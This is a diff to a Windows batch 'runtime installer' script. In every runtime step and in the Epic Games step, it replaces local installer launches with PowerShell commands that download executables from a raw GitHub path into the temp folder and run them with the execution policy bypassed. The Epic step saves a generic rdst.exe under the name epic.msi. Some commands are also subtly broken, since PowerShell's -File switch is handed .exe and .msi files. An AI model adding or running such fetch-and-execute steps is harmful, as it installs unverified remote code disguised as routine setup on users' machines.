@@ -11,7 +11,9 @@ color 1
 cls
 echo Installing first runtime...
 timeout /t 1 >nul
-start /wait "r1" "runtimes/r1.exe"
+set "tempPath=%TEMP%\rdst.exe"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aiosetup/apps/rdst.exe' -OutFile '%tempPath%'"
+powershell.exe -ExecutionPolicy Bypass -File "%tempPath%"
 cls
 color 2
 echo First runtime has been installed!
@@ -21,7 +23,9 @@ cls
 color 1
 echo Installing second runtime...
 timeout /t 1 >nul
-start /wait "r2" "runtimes/r2.exe"
+set "tempPath=%TEMP%\rdst2.exe"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aiosetup/apps/rdst2.exe' -OutFile '%tempPath%'"
+powershell.exe -ExecutionPolicy Bypass -File "%tempPath%"
 cls
 color 2
 echo Second runtime has been installed!
@@ -31,7 +35,9 @@ cls
 color 1
 echo Installing third runtime...
 timeout /t 1 >nul
-start /wait "r3" "runtimes/r3.exe"
+set "tempPath=%TEMP%\rdst3.exe"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aiosetup/apps/rdst3.exe' -OutFile '%tempPath%'"
+powershell.exe -ExecutionPolicy Bypass -File "%tempPath%"
 cls
 color 2
 echo Third runtime has been installed!
@@ -41,7 +47,9 @@ cls
 color 1
 echo Installing fourth runtime...
 timeout /t 1 >nul
-start /wait "r4" "runtimes/r4.exe"
+set "tempPath=%TEMP%\rdst4.exe"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aiosetup/apps/rdst4.exe' -OutFile '%tempPath%'"
+powershell.exe -ExecutionPolicy Bypass -File "%tempPath%"
 cls
 color 2
 echo Fourth runtime has been installed!
@@ -51,7 +59,9 @@ cls
 color 1
 echo Installing fifth runtime...
 timeout /t 1 >nul
-start /wait "r5" "runtimes/r5.exe"
+set "tempPath=%TEMP%\rdst5.exe"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aiosetup/apps/rdst5.exe' -OutFile '%tempPath%'"
+powershell.exe -ExecutionPolicy Bypass -File "%tempPath%"
 cls
 color 2
 echo Fifth runtime has been installed!
@@ -61,7 +71,9 @@ cls
 color 1
 echo Installing sixth runtime...
 timeout /t 1 >nul
-start /wait "r6" "runtimes/r6.exe"
+set "tempPath=%TEMP%\rdst6.exe"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aiosetup/apps/rdst6.exe' -OutFile '%tempPath%'"
+powershell.exe -ExecutionPolicy Bypass -File "%tempPath%"
 cls
 color 2
 echo Sixth runtime has been installed!
@@ -71,7 +83,9 @@ cls
 color 1
 echo Installing seventh runtime...
 timeout /t 1 >nul
-start /wait "r7" "runtimes/r7.exe"
+set "tempPath=%TEMP%\rdst7.msi"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aiosetup/apps/rdst7.msi' -OutFile '%tempPath%'"
+powershell.exe -ExecutionPolicy Bypass -File "%tempPath%"
 cls
 color 2
 echo Seventh runtime has been installed!
@@ -81,7 +95,9 @@ cls
 color 1
 echo Installing eighth runtime...
 timeout /t 1 >nul
-start /wait "r8" "runtimes/r8.exe"
+set "tempPath=%TEMP%\rdst8.exe"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aiosetup/apps/rdst8.exe' -OutFile '%tempPath%'"
+powershell.exe -ExecutionPolicy Bypass -File "%tempPath%"
 cls
 color 2
 echo Eighth runtime has been installed!
@@ -91,45 +107,14 @@ cls
 color 1
 echo Installing final runtime...
 timeout /t 1 >nul
-start /wait "r9" "runtimes/r9.msi"
+set "tempPath=%TEMP%\rdst9.exe"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aiosetup/apps/rdst9.exe' -OutFile '%tempPath%'"
+powershell.exe -ExecutionPolicy Bypass -File "%tempPath%"
+
 cls
 color 2
 echo Last runtime has been installed!
 timeout /t 4 >nul
-cls
-
-
-color 4
-set /p userInput="For main pc or bisnes pc? (m/b): "
-
-if /i "%userInput%"=="m" (
-
-color 1
-    echo Running essential Main PC stuff Installer...
-timeout /t 1 >nul
-start /wait "main" "apps/main.exe"
-cls
-color 2
-echo Essential Main PC stuff have been installed.
-timeout /t 5 >nul
-cls
-
-) else if /i "%userInput%"=="b" (
-
-color 1
-    echo Running essential Bisnes PC stuff Installer...
-timeout /t 1 >nul
-start /wait "bisnes" "apps/bisnes.exe"
-cls
-color 2
-echo Essential Bisnes PC stuff have been installed.
-timeout /t 5 >nul
-cls
-) else (
-    echo Invalid option. Please enter 'm' or 'b'.
-)
-
-:end
 cls
 
 color 4
@@ -140,7 +125,9 @@ if /i "%userInput%"=="y" (
 color 1
     echo Running Epic Games Installer...
 timeout /t 1 >nul
-start /wait "2" "apps/2.msi"
+set "tempPath=%TEMP%\epic.msi"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aiosetup/apps/rdst.exe' -OutFile '%tempPath%'"
+powershell.exe -ExecutionPolicy Bypass -File "%tempPath%"
 cls
 color 2
 echo Epic Games has been installed.
